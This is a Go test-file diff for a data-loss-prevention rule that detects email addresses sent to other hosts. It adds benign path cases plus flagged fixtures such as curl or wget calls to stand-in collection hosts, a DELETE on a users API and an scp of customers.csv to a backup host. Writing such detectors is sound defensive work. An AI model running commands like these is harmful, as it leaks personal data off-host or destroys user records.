@@ -51,6 +51,9 @@ func TestEmailRuleSkipsAddressShapedPathSegments(t *testing.T) {
 		`C:\Users\dana.reyes@contoso.com\project\README.md`,
 		"cd /home/eng1@dclab.test",
 		"cat file:///home/eng1@dclab.test/notes.txt",
+		"ls ~/work/eng1@dclab.test/notes",
+		"cat ../eng1@dclab.test/notes.txt",
+		"--home=/home/eng1@dclab.test/x",
 	} {
 		if loc := firstAcceptedRuleMatch(rule, text); loc != nil {
 			t.Errorf("ENT-EMAIL-BULK fired on %q in %q", text[loc[0]:loc[1]], text)
@@ -64,6 +67,15 @@ func TestEmailRuleSkipsAddressShapedPathSegments(t *testing.T) {
 		"curl -X DELETE https://api.vendor.io/v1/users/jane.doe@acme-corp.com",
 		"wget -q https://drop.example.org/jane.doe@acme-corp.com/",
 		"fetch('//cdn.example.net/u/jane.doe@acme-corp.com')",
+		// GAP-1973: scheme-less URLs, scp host:path and UNC paths go to
+		// another host too.
+		"curl collect.example.net/u/jane.doe@acme-corp.com",
+		"curl -sX DELETE api.vendor.io/v1/users/jane.doe@acme-corp.com",
+		"wget -q drop.example.org/jane.doe@acme-corp.com/",
+		"curl --url=collect.example.net/u/jane.doe@acme-corp.com",
+		"Invoke-WebRequest -Uri collect.example.net/u/jane.doe@acme-corp.com",
+		"scp customers.csv ops@backup.example.net:/srv/drop/jane.doe@acme-corp.com/",
+		`copy x \\files.example.net\drop\jane.doe@acme-corp.com\`,
 	} {
 		if firstAcceptedRuleMatch(rule, text) == nil {
 			t.Errorf("ENT-EMAIL-BULK did not fire on %q", text)
